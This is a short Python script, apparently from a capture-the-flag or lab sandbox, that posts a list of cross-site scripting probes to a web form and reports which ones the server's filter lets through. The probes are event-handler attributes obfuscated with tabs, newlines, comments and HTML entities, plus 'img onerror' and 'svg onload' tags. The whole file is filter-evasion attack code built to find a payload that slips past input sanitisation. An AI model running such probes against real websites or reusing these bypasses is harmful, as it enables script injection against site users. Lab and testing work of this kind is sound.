import requests
b="https://56773-a245e895397d415a9c9e494df6c22a7b.sbx.secso.cc"
def post(desc):
    base={"title":"h","author":"b","description":desc,"reference":"http://e.com"}
    r=requests.post(b+"/category/tech/new", data=base, timeout=20, allow_redirects=False)
    return "OK" if r.status_code==302 else "BLOCK"
tests=[
 "<a onclick=x>",
 "<a on\tclick=x>",      # real tab
 "<a on\nclick=x>",      # real newline
 "<a/**/onclick=x>",
 "<a oncl\tick=x>",
 "<img/src=x/onerror=x>",
 "<svg onload=x>",
 "<a on&#9;click=x>",
 "<a &#111;nclick=x>",   # entity o
 "<a onclick&#61;x>",    # entity =
 "onerror",
 "on error",
 "one",
 "only",
 "online",
 "on1",
 "on_",
 "on-click",
 "<a onclick =x>",
 "<a\tonclick=x>",
]
for t in tests:
    print(post(t).ljust(6), repr(t))
